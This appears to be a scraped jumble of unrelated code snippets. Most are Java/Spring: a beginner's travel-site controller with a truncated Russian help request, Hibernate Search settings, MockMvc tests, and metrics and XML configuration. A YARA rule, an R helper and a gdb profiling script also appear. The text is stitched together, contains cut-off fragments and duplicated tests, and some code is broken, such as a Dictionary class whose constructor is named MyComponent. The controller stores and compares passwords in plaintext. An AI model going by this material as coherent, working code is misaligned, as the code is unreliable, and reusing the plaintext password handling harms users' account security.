77
78
79
80
81
82
83
84
85
86
87
88
89
90
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <packaging>war</packaging>
 
    <groupId>com</groupId>
    <artifactId>Traveler</artifactId>
    <version>1.0</version>
 
    <name>Traveler</name>
 
    <properties>
        <springframework.version>4.3.8.RELEASE</springframework.version>
        <hibernate.version>5.2.9.Final</hibernate.version>
    </properties>
 
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-war-plugin</artifactId>
                <configuration>
                    <failOnMissingWebXml>false</failOnMissingWebXml>
                </configuration>
            </plugin>
        </plugins>
    </build>
 
    <dependencies>
        <!-- Servlet -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.0-b05</version>
        </dependency>
 
        <!-- JSTL -->
        <dependency>
            <groupId>jstl</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
 
        <!-- Spring -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>${springframework.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-orm</artifactId>
            <version>${springframework.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>${springframework.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>${springframework.version}</version>
        </dependency>
 
        <!-- Hibernate -->
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-core</artifactId>
            <version>${hibernate.version}</version>
        </dependency>
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-entitymanager</artifactId>
            <version>${hibernate.version}</version>
        </dependency>
 
        <!-- MySQL -->
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.40</version>
        </dependency>
    </dependencies>
 
 
 
</project>

package com.spring.controller;
 
import com.spring.configuration.WebConfiguration;
import com.spring.model.Place;
import com.spring.model.User;
import com.spring.service.PlaceService;
import com.spring.service.UserService;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.support.AbstractApplicationContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;
 
import java.util.ArrayList;
 
@Controller
public class HomeController {
    @RequestMapping(value = "/", method = RequestMethod.GET)
    public ModelAndView home() {
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject("user", new User());
        modelAndView.setViewName("index");
 
        return modelAndView;
    }
 
    @RequestMapping(value = "/reg", method = RequestMethod.POST)
    public ModelAndView reg(@ModelAttribute("user") User user) {
        AbstractApplicationContext context = new AnnotationConfigApplicationContext(WebConfiguration.class);
        ModelAndView modelAndView = new ModelAndView();
        UserService service = (UserService) context.getBean("userService");
 
        modelAndView.setViewName("registration");
        modelAndView.addObject("user", user);
        service.saveUser(user);
 
        context.close();
        return modelAndView;
    }
 
    @RequestMapping(value = "/reg", method = RequestMethod.GET)
    public ModelAndView authorization(@ModelAttribute("user") User user) {
        AbstractApplicationContext context = new AnnotationConfigApplicationContext(WebConfiguration.class);
        ModelAndView modelAndView = new ModelAndView();
        UserService service = (UserService) context.getBean("userService");
 
        modelAndView.addObject("user", user);
 
        if (service.findByLogin(user.getLogin()) != null)
        {
            if (service.findByLogin(user.getLogin()).getPassword().equals(user.getPassword()))
                modelAndView.setViewName("authorization");
            else
                modelAndView.setViewName("authorizeFail");
        }
        else
        modelAndView.setViewName("authorizeFail");
 
        context.close();
        return modelAndView;
    }
 
    @RequestMapping(value = "/list", method = RequestMethod.GET)
    public ModelAndView list(@ModelAttribute("user") User user, @ModelAttribute("list") ArrayList<Place> list) {
        AbstractApplicationContext context = new AnnotationConfigApplicationContext(WebConfiguration.class);
        PlaceService service = (PlaceService) context.getBean("placeService");
 
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject("user", user);
        list = (ArrayList<Place>) service.findAllPlaces();
        modelAndView.addObject("list", list);
        modelAndView.setViewName("list");
 
        context.close();
        return modelAndView;
    }
}
Проект на Git


Помогите пожалуйста, сильно не критикуйте, мой первый web проект и я много чего не знаю(
Ответ: Это мой первый пр
--------------------------------------------------------------------------------------------------------
Example 24. Example performance option configuration
hibernate.search.Animals.2.indexwriter.max_merge_docs = 10
hibernate.search.Animals.2.indexwriter.merge_factor = 20
hibernate.search.Animals.2.indexwriter.max_buffered_docs = default
hibernate.search.default.indexwriter.max_merge_docs = 100
hibernate.search.default.indexwriter.ram_buffer_size = 64
The configuration in Example performance option configuration will result in these settings applied on the second shard of the Animal index:

max_merge_docs = 10

merge_factor = 20

ram_buffer_size = 64MB

max_buffered_docs = Lucene default
--------------------------------------------------------------------------------------------------------
public class BigDecimalNumericFieldBridge implements TwoWayFieldBridge {

    private static final BigDecimal storeFactor = BigDecimal.valueOf( 100 );

    @Override
    public void set(String name, Object value, Document document, LuceneOptions luceneOptions) {
        if ( value != null ) {
            BigDecimal decimalValue = (BigDecimal) value;
            Long indexedValue = decimalValue.multiply( storeFactor ).longValue();
            luceneOptions.addNumericFieldToDocument( name, indexedValue, document );
        }
    }

    @Override
    public Object get(String name, Document document) {
        String fromLucene = document.get( name );
        BigDecimal storedBigDecimal = new BigDecimal( fromLucene );
        return storedBigDecimal.divide( storeFactor );
    }

    @Override
    public String objectToString(Object object) {
        return object.toString();
    }
}

https://docs.jboss.org/hibernate/stable/search/reference/en-US/html_single/#_configuration
--------------------------------------------------------------------------------------------------------
import javax.validation.ConstraintViolation;
import javax.validation.ConstraintViolationException;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;

import java.util.Set;

import io.reflectoring.validation.Input;
import org.springframework.stereotype.Service;

@Service
public class ProgrammaticallyValidatingService {

  private Validator validator;

  public ProgrammaticallyValidatingService(Validator validator) {
    this.validator = validator;
  }

  public void validateInput(Input input) {
    ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
    Validator validator = factory.getValidator();
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }

  public void validateInputWithInjectedValidator(Input input) {
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }
}
--------------------------------------------------------------------------------------------------------
import com.memorynotfound.kafka.producer.Sender;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SpringKafkaApplication implements CommandLineRunner {

    public static void main(String[] args) {
        SpringApplication.run(SpringKafkaApplication.class, args);
    }

    @Autowired
    private Sender sender;

    @Override
    public void run(String... strings) throws Exception {
        for (int i = 1; i < 13; i++){
            sender.send("message-" + i);
        }
    }
}
--------------------------------------------------------------------------------------------------------
about:preferences#search
--------------------------------------------------------------------------------------------------------
        this.externalFileIds = Stream.concat(this.externalFileIds.stream(), externalFileIds.stream())
                .collect(Collectors.toList());
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = TestApplication.class, webEnvironment = WebEnvironment.DEFINED_PORT)
public class ExcludeAutoConfigIntegrationTest {
    // ...
}
@SpringBootApplication(exclude=SecurityAutoConfiguration.class)
public class TestApplication {
 
    public static void main(String[] args) {
        SpringApplication.run(TestApplication.class, args);
    }
}
--------------------------------------------------------------------------------------------------------
<configuration>
	<include resource="logback-appender.xml" />
	<include resource="env/${sys.env}/logback-logger.xml" optional="true" />

	<appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
		<appender-ref ref="MAIN" />
	</appender>

	<root level="INFO">
		<appender-ref ref="ASYNC" />
	</root>
</configuration>
--------------------------------------------------------------------------------------------------------
service-config.json
{
	"basePackage": "org.afc.petstore",
	"apiPackage": "org.afc.petstore.api",
	"configPackage": "org.afc.petstore.config",
	"modelPackage": "org.afc.petstore.model",
	"delegatePattern": "true",
	"hideGenerationTimestamp": "true"
}
--------------------------------------------------------------------------------------------------------
	@Bean
    public Docket swaggerSpringMvcPlugin() {
        return new Docket(DocumentationType.SWAGGER_2)
        		.select()
        		.apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
        		.build()
        		.securitySchemes(Collections.singletonList(new ApiKey("Bearer", "Authorization", "header")));
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.Resource;
import org.springframework.stereotype.Component;
import org.tuckey.web.filters.urlrewrite.Conf;
import org.tuckey.web.filters.urlrewrite.UrlRewriteFilter;

import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import java.io.IOException;


@Component
public class MyUrlRewriteFilter extends UrlRewriteFilter {

    private static final String CONFIG_LOCATION = "classpath:/urlrewrite.xml";

    //Inject the Resource from the given location
    @Value(CONFIG_LOCATION)
    private Resource resource;

    //Override the loadUrlRewriter method, and write your own implementation
    @Override
    protected void loadUrlRewriter(FilterConfig filterConfig) throws ServletException {
        try {
            //Create a UrlRewrite Conf object with the injected resource
            Conf conf = new Conf(filterConfig.getServletContext(), resource.getInputStream(), resource.getFilename(), "@@yourOwnSystemId@@");
            checkConf(conf);
        } catch (IOException ex) {
            throw new ServletException("Unable to load URL rewrite configuration file from " + CONFIG_LOCATION, ex);
        }
    }
}

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlrewrite PUBLIC "-//tuckey.org//DTD UrlRewrite 4.0//EN"
        "http://www.tuckey.org/res/dtds/urlrewrite4.0.dtd">
<urlrewrite>
    <rule>
        <from>/users/swagger-ui.html</from>
        <to type="passthrough">/swagger-ui.html</to>
    </rule>

    <rule>
        <from>/users/webjars/(.*)</from>
        <to type="passthrough">/webjars/$1</to>
    </rule>

    <rule>
        <from>/users/api-docs</from>
        <to type="passthrough">/api-docs</to>
    </rule>

    <rule>
    <from>/users/configuration/(.*)</from>
    <to type="passthrough">/configuration/$1</to>
    </rule>

    <rule>
    <from>/users/swagger-resources</from>
    <to type="passthrough">/swagger-resources</to>
</rule>
</urlrewrite>
--------------------------------------------------------------------------------------------------------
@SpringBootTest(classes = {BackupTestDefinition.class})
@ActiveProfiles({"test", "dev"})
@RunWith(SpringRunner.class)
public class BackupServiceTest {
    @Value(value = "${ne.endpoint}")
    private String ne;
    @Autowired
    private RestTemplate restTemplate;    
    private MockRestServiceServer mockServer;

    @Before
    public void setup() {
        mockServer = MockRestServiceServer.bindTo(restTemplate).build(new UnorderedRequestExpectationManager());
        mockServer.expect(ExpectedCount.manyTimes(), requestTo(UriComponentsBuilder.fromHttpUrl(ne).build().toUri())).andExpect(method(HttpMethod.POST)).andRespond(withSuccess());
    }

    @Test
    public void testNotificationProcessing() throws IOException, InterruptedException, InitializationException, ExecutionException {
        //some testing code
    }
}

@RunWith(SpringRunner.class)
@SpringBootTest(classes = CityController.class, webEnvironment = SpringBootTest.WebEnvironment.MOCK)
@AutoConfigureMockMvc
public class CityControllerTest {
    @Autowired
    MockMvc mockMvc;

    @Test
    public void testGetAllCities() throws Exception {
        mockMvc.perform(get("/cities")
                .contentType(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk());
    }
}
@Bean(name = "springCacheManager")
  @ConditionalOnMissingBean
  public RedisCacheManager cacheManager(RedisConnectionFactory redisConnectionFactory) {
    RedisCacheManagerBuilder builder = RedisCacheManager
        .builder(redisConnectionFactory).cacheDefaults(getConfiguration());
    List<String> cacheNames = this.cacheProperties.getCacheNames();
    if (!cacheNames.isEmpty()) {
      builder.initialCacheNames(new LinkedHashSet<>(cacheNames));
    }
    return this.customizerInvoker.customize(builder.build());
--------------------------------------------------------------------------------------------------------
secondArray = Arrays.stream(array)
              .flatMapToInt(i -> Arrays.stream(i)) //преобразовываем Stream<int[]> в Stream
              .toArray(); // преобразовываем Stream в int[] 
--------------------------------------------------------------------------------------------------------
	<plugin>
					<groupId>org.apache.maven.plugins</groupId>
					<artifactId>maven-failsafe-plugin</artifactId>
					<version>2.5</version>
					<configuration>
						<argLine>-Xms512m -Xmx1024m -XX:PermSize=128m</argLine>
					</configuration>
				</plugin>
--------------------------------------------------------------------------------------------------------
/set options +HISTORY_DISCLOSED
--------------------------------------------------------------------------------------------------------
class Dictionary {
	private List<String> words = new CopyOnWriteArrayList<>();

	public MyComponent(MeterRegistry registry) {
		registry.gaugeCollectionSize("dictionary.size", Tags.empty(), words);
	}

	...
}
--------------------------------------------------------------------------------------------------------
docker run -d --rm --name jmx -p 5000:5000 sysdiglabs/jmx-metrics:0.1
--------------------------------------------------------------------------------------------------------
package com.paragon.mailingcontour.commons.actuator.metrics;

import com.paragon.mailingcontour.commons.utils.MessageBuffer;
import io.micrometer.core.instrument.Counter;
import io.micrometer.core.instrument.Gauge;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Tag;
import io.micrometer.core.instrument.binder.MeterBinder;
import io.micrometer.core.lang.NonNullApi;
import io.micrometer.core.lang.NonNullFields;

import java.util.Collections;
import java.util.Optional;

@NonNullApi
@NonNullFields
public class ErrorsMetrics implements MeterBinder, AutoCloseable {
    /**
     * Errors metrics counter name
     */
    public static final String ERRORS_METRICS_COUNTER = "errors.counter.total";
    /**
     * Errors metrics gauge name
     */
    public static final String ERRORS_METRICS_GAUGE = "errors.buffer";

    private final MessageBuffer messageBuffer;
    private final Iterable<Tag> tags;

    public ErrorsMetrics(final MessageBuffer messageBuffer) {
        this(messageBuffer, null);
    }

    public ErrorsMetrics(final MessageBuffer<Object> messageBuffer, final Iterable<Tag> tags) {
        this.messageBuffer = messageBuffer;
        this.tags = Optional.ofNullable(tags).orElseGet(Collections::emptyList);
    }

    @Override
    public void bindTo(final MeterRegistry registry) {
        Counter.builder(ERRORS_METRICS_COUNTER)
                .description("Total number of registered error events")
                .tags(this.tags)
                .tags("counter", "error")
                .baseUnit("errors")
                .register(registry);

        Gauge.builder(ERRORS_METRICS_GAUGE, this.messageBuffer, MessageBuffer::size)
                .description("Registered errors stored in a buffer")
                .tags(this.tags)
                .tags("buffer", "error")
                .baseUnit("errors")
                .register(registry);
    }

    @Override
    public void close() {
        this.messageBuffer.clear();
    }
}
--------------------------------------------------------------------------------------------------------
String rawJson = Resources.asString("json-test/nested.json");
JsonNode node = Json.serializer()
                    .nodeFromJson(rawJson)
                    .path("nested1")
                    .path("nested2")
                    .path("nested3");
Message message = Json.serializer().fromNode(node, new TypeReference<Message>() {});
--------------------------------------------------------------------------------------------------------
@Component
@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)
public class MyBean {

    @InjectRandomInt
    private int value1;

    @InjectRandomInt(min = 100, max = 200)
    private int value2;

    private int value3;

    @Override
    public String toString() {
        return "MyBean{" +
                "value1=" + value1 +
                ", value2=" + value2 +
                ", value3=" + value3 +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
#' @importFrom utils savehistory

get_history_tail <- function(n) {
  savehistory(tmp <- tempfile())
  on.exit(unlink(tmp))
  tail(readLines(tmp), n)
}

drop_comment_char <- function(x) {
  sub("^(\\s*git\\s+)#?", "\\1", x)
}

echo_command <- function(x) {
  ## Current prompt, can be multiple lines, take the last
  pr <- tail(strsplit(getOption("prompt"), "\n")[[1]], 1)
  cat(pr, x, "\n", sep = "")
}

find_parent <- function(name, pkg = NULL) {
  if (!is.null(pkg)) name <- call("::", pkg, name)
  calls <- sys.calls()
  for (i in seq_along(calls)) {
    if (identical(calls[[i]][[1]], name)) return(i)
  }
  NA_integer_
}
--------------------------------------------------------------------------------------------------------
private rule Macho
{
    meta:
        description = "private rule to match Mach-O binaries (copied from Apple's XProtect)"
    condition:
        uint32(0) == 0xfeedface or uint32(0) == 0xcefaedfe or uint32(0) == 0xfeedfacf or uint32(0) == 0xcffaedfe or uint32(0) == 0xcafebabe or uint32(0) == 0xbebafeca
}

rule ZoomDaemon
{
    meta:
        description = "ZoomDaemon and its whitelabels"
    strings:
        $ = "zLocalHostWrapper"
        $ = "ZMClientHelper"
        $ = "ZMLocalHostMgr"
    condition:
        Macho and all of them
}
--------------------------------------------------------------------------------------------------------
//        final StringBuilder sb = new StringBuilder();
//        sb.append("From: foo@bar.com\r\n");
//        sb.append("To: someone@else.com\r\n");
//        sb.append("Final-Recipient: someone@else.com\r\n");
//        sb.append("Diagnostic-Code: 4.4.2\r\n");
//        sb.append("Content-type: message/delivery-status\r\n");
//        sb.append("\r\n");
//        sb.append("This is the preamble.\r\n");
//        sb.append("--boundary\r\n");
//        sb.append("Content-type: text/plain\r\n");
//        sb.append("\r\n");
//        sb.append("This is the first body.\r\n");
//        sb.append("It's completely meaningless.\r\n");
//        sb.append("After this line the body ends.\r\n");
//        sb.append("\r\n");
//        sb.append("--boundary--\r\n");
//        return "From: foo@bar.com\r\n" +
//                "To: someone@else.com\r\n" +
//                "Final-Recipient: someone@else.com\r\n" +
//                "Diagnostic-Code: 4.4.2\r\n" +
//                "Content-type: message/delivery-status\r\n" +
//                "\r\n" +
//                "This is the preamble.\r\n" +
//                "--boundary\r\n" +
//                "Content-type: text/plain\r\n" +
//                "\r\n" +
//                "This is the first body.\r\n" +
//                "It's completely meaningless.\r\n" +
//                "After this line the body ends.\r\n" +
//                "\r\n" +
//                "--boundary--\r\n";

--------------------------------------------------------------------------------------------------------
# This script is from http://poormansprofiler.org/
#
# NOTE: Instead of using this script, you should use the Redis
# Software Watchdog, which provides a similar functionality but in
# a more reliable / easy to use way.
#
# Check http://redis.io/topics/latency for more information.

#!/bin/bash
nsamples=1
sleeptime=0
pid=$(ps auxww | grep '[r]edis-server' | awk '{print $2}')

for x in $(seq 1 $nsamples)
  do
    gdb -ex "set pagination 0" -ex "thread apply all bt" -batch -p $pid
    sleep $sleeptime
  done | \
awk '
  BEGIN { s = ""; } 
  /Thread/ { print s; s = ""; } 
  /^\#/ { if (s != "" ) { s = s "," $4} else { s = $4 } } 
  END { print s }' | \
sort | uniq -c | sort -r -n -k 1,1
--------------------------------------------------------------------------------------------------------
git lfs install
git lfs track "*.psd"
git add .gitattributes

git add file.psd
git commit -m "Add design file"
git push origin master
--------------------------------------------------------------------------------------------------------
server:
  port: ${random:int(4)}
  
java -jar spring-boot-app.jar -Dserver.port=2020
--------------------------------------------------------------------------------------------------------
tLanguages_null_shouldReturnOk()Java
@Test
public void getLanguages_null_shouldReturnOk() throws Exception {
  // Given
  final Language mockedEsoteric = new Language("Arnoldc", "Lauri Hartikka");
  final List<Language> mockedLanguages = Stream.concat(
      LanguageRepository.LANGUAGES.stream(),
      Stream.of(mockedEsoteric)).collect(Collectors.toList());
  doReturn(mockedLanguages).when(languageService).getLanguages(null);

  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages")
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));

  // Then
  result.andExpect(status().isOk());
  result.andExpect(jsonPath("$.length()").value(mockedLanguages.size()));
  result.andExpect(jsonPath("$[?(@.name === 'Arnoldc')]").exists());
}

@Test
public void getLanguages_null_shouldReturnOk() throws Exception {
  // Given
  final Language mockedEsoteric = new Language("Arnoldc", "Lauri Hartikka");
  final List<Language> mockedLanguages = Stream.concat(
      LanguageRepository.LANGUAGES.stream(),
      Stream.of(mockedEsoteric)).collect(Collectors.toList());
  doReturn(mockedLanguages).when(languageService).getLanguages(null);
 
  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages")
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
  // Then
  result.andExpect(status().isOk());
  result.andExpect(jsonPath("$.length()").value(mockedLanguages.size()));
  result.andExpect(jsonPath("$[?(@.name === 'Arnoldc')]").exists());
}
--------------------------------------------------------------------------------------------------------
@Autowired
private MockMvc mvc;
 
@Test
public void getAllEmployeesAPI() throws Exception
{
  mvc.perform( MockMvcRequestBuilders
      .get("/employees")
      .accept(MediaType.APPLICATION_JSON))
      .andDo(print())
      .andExpect(status().isOk())
      .andExpect(MockMvcResultMatchers.jsonPath("$.employees").exists())
      .andExpect(MockMvcResultMatchers.jsonPath("$.employees[*].employeeId").isNotEmpty());
}
 
@Test
public void getEmployeeByIdAPI() throws Exception
{
  mvc.perform( MockMvcRequestBuilders
      .get("/employees/{id}", 1)
      .accept(MediaType.APPLICATION_JSON))
      .andDo(print())
      .andExpect(status().isOk())
      .andExpect(MockMvcResultMatchers.jsonPath("$.employeeId").value(1));
}
--------------------------------------------------------------------------------------------------------
@EnableAutoConfiguration(
        exclude = {
                IntegrationAutoConfiguration.class,
                RedisAutoConfiguration.class,
                RedisRepositoriesAutoConfiguration.class,
                MailSenderValidatorAutoConfiguration.class
        }
)
--------------------------------------------------------------------------------------------------------
@Test
public void getLanguage_nonExistingLanguage_shouldReturnNotFound() throws Exception {
  // Given
  final String mockedLanguageName = "Arnoldc";
  doReturn(Optional.empty()).when(languageService).getLanguage(mockedLanguageName);

  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages/".concat(mockedLanguageName))
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));

  // Then
  result.andExpect(status().isNotFound());
}

@Test
public void getLanguage_nonExistingLanguage_shouldReturnNotFound() throws Exception {
  // Given
  final String mockedLanguageName = "Arnoldc";
  doReturn(Optional.empty()).when(languageService).getLanguage(mockedLanguageName);
 
  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages/".concat(mockedLanguageName))
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
  // Then
  result.andExpect(status().isNotFound());
}
--------------------------------------------------------------------------------------------------------
@Test
public void getLanguages_invalidAcceptHeader_shouldReturnNotAcceptable() throws Exception {
  // Given
  final String invalidAcceptMimeType = MimeTypeUtils.APPLICATION_XML_VALUE;
  doReturn(LanguageRepository.LANGUAGES).when(languageService).getLanguages(null);
 
  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages")
          .accept(invalidAcceptMimeType));
 
  // Then
  result.andExpect(status().isNotAcceptable());
}
--------------------------------------------------------------------------------------------------------
guageApiControllerApplicationIntegrationTest.javaJava
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = {
    SpringMockMvcConfiguration.class
})
public class LanguageApiControllerApplicationIntegrationTest {

  @Autowired
  private WebApplicationContext webApplicationContext;

  private MockMvc mockMvc;

  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .webAppContextSetup(webApplicationContext)
        .build();
  }
/*...*/
  @Test
  public void getLanguages_null_shouldReturnOk() throws Exception {
    // Given
    // Real application context

    // When
    final ResultActions result = mockMvc.perform(
        get("/api/languages")
            .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));

    // Then
    final int expectedSize = LANGUAGES.size();
    final String[] expectedLanguageNames = LANGUAGES.stream().map(Language::getName)
        .collect(Collectors.toList()).toArray(new String[LANGUAGES.size()]);
    result.andExpect(status().isOk());
    result.andExpect(jsonPath("$.length()").value(expectedSize));
    result.andExpect(jsonPath("$[*].name", containsInAnyOrder(expectedLanguageNames)));
  }

}

guageApiControllerTest.javaJava
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {
    LanguageApiController.class
})
@Import(Config.class)
public class LanguageApiControllerTest {

  @Autowired
  private LanguageService languageService;

  @Autowired
  private LanguageApiController languageApiController;

  private MockMvc mockMvc;

  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .standaloneSetup(languageApiController)
        .build();
  }

/* ... */

  @TestConfiguration
  protected static class Config {

    @Bean
    public LanguageService languageService() {
      return Mockito.mock(LanguageService.class);
    }

  }

}


@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {
    LanguageApiController.class
})
@Import(Config.class)
public class LanguageApiControllerTest {
 
  @Autowired
  private LanguageService languageService;
 
  @Autowired
  private LanguageApiController languageApiController;
 
  private MockMvc mockMvc;
 
  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .standaloneSetup(languageApiController)
        .build();
  }
 
/* ... */
 
  @TestConfiguration
  protected static class Config {
 
    @Bean
    public LanguageService languageService() {
      return Mockito.mock(LanguageService.class);
    }
 
  }
 
}


@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = {
    SpringMockMvcConfiguration.class
})
public class LanguageApiControllerApplicationIntegrationTest {
 
  @Autowired
  private WebApplicationContext webApplicationContext;
 
  private MockMvc mockMvc;
 
  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .webAppContextSetup(webApplicationContext)
        .build();
  }
/*...*/
  @Test
  public void getLanguages_null_shouldReturnOk() throws Exception {
    // Given
    // Real application context
 
    // When
    final ResultActions result = mockMvc.perform(
        get("/api/languages")
            .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
    // Then
    final int expectedSize = LANGUAGES.size();
    final String[] expectedLanguageNames = LANGUAGES.stream().map(Language::getName)
        .collect(Collectors.toList()).toArray(new String[LANGUAGES.size()]);
    result.andExpect(status().isOk());
    result.andExpect(jsonPath("$.length()").value(expectedSize));
    result.andExpect(jsonPath("$[*].name", containsInAnyOrder(expectedLanguageNames)));
  }
 
}

@RunWith(SpringRunner.class)
@WebMvcTest(controllers = LanguageApiController.class)
public class LanguageApiControllerWebMvcTest {
 
  @Autowired
  private MockMvc mockMvc;
 
  @Test
  public void getLanguages_null_shouldReturnOk() throws Exception {
    // Given
    // Real application context
 
    // When
    final ResultActions result = mockMvc.perform(
        get("/api/languages")
            .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
    // Then
    final int expectedSize = LANGUAGES.size();
    final String[] expectedLanguageNames = LANGUAGES.stream().map(Language::getName)
        .collect(Collectors.toList()).toArray(new String[LANGUAGES.size()]);
    result.andExpect(status().isOk());
    result.andExpect(jsonPath("$.length()").value(expectedSize));
    result.andExpect(jsonPath("$[*].name", containsInAnyOrder(expectedLanguageNames)));
  }
}
--------------------------------------------------------------------------------------------------------
  public void getLanguages_null_shouldReturnListOfStrings() throws Exception {
    // Given
    final String mockedEsoteric = "Arnoldc";
    final List<String> mockedLanguages = Stream.concat(
        LanguageRepository.LANGUAGES.stream(),
        Stream.of(mockedEsoteric)).collect(Collectors.toList());
    doReturn(mockedLanguages).when(languageService).getLanguages(null);
 
    // When
    final ResponseEntity<List<String>> result = languageApiController.getLanguages(null);
 
    // Then
    assertThat(result.getBody(), hasSize(mockedLanguages.size()));
    assertThat(result.getBody(), hasItem(mockedEsoteric));
  }
}
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping(value = "/api", produces = MimeTypeUtils.APPLICATION_JSON_VALUE)
public class LanguageApiController {
 
  private final LanguageService languageService;
 
  @Autowired
  public LanguageApiController(
      LanguageService languageService) {
    this.languageService = languageService;
  }
 
  @RequestMapping(value = "/languages", method = GET)
  public ResponseEntity<List<Language>> getLanguages(@RequestParam(value = "contains", required = false) String contains) {
    return ResponseEntity.ok(languageService.getLanguages(contains));
  }
 
  @RequestMapping(value = "/languages/{name}", method = GET)
  public ResponseEntity<Language> getLanguage(@PathVariable("name") String name) {
    return ResponseEntity.ok(languageService.getLanguage(name).orElseThrow(() -> new SpringMockMvcException(
        HttpStatus.NOT_FOUND, "Language was not found")));
  }
 
  @ExceptionHandler(SpringMockMvcException.class)
  public ResponseEntity<String> onSpringMockMvcException(HttpServletRequest request, SpringMockMvcException ex) {
    return ResponseEntity.status(ex.getHttpStatus()).body(String.format("%s - %s",
        ex.getHttpStatus().value(), ex.getMessage()));
  }
 
}
--------------------------------------------------------------------------------------------------------
Map<String, Integer> map = Stream.of(
  new AbstractMap.SimpleEntry<>("idea", 1), 
  new AbstractMap.SimpleEntry<>("mobile", 2))
  .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue));
  
Map<String, String> map = Stream.of(new String[][] { 
    { "Hello", "World" }, 
    { "John", "Doe" },
}).collect(Collectors.collectingAndThen(
    Collectors.toMap(data -> data[0], data -> data[1]), 
    Collections::<String, String> unmodifiableMap));
--------------------------------------------------------------------------------------------------------
MvcResult mvcResult = super.mockMvc.perform(get("url").accept(MediaType.APPLICATION_JSON).headers(basicAuthHeaders()))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[0].id", is(6))).andReturn();

String response = mvcResult.getResponse().getContentAsString();
Integer id = JsonPath.parse(response).read("$[0].id");
--------------------------------------------------------------------------------------------------------
import static org.mockito.Matchers.any;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.setup.MockMvcBuilders.webAppContextSetup;
@RunWith(SpringRunner.class)
@SpringBootTest(classes={ Application.class })
public class AccountControllerTest {
  private MockMvc mockMvc;
  @Autowired
  private WebApplicationContext webApplicationContext;
  @MockBean 
  private AccountService accountServiceMock;
  @Before
  public void setUp() {
    this.mockMvc = webAppContextSetup(webApplicationContext).build();
  }
--------------------------------------------------------------------------------------------------------
mockMvc.perform(get("/api/users/" + id))
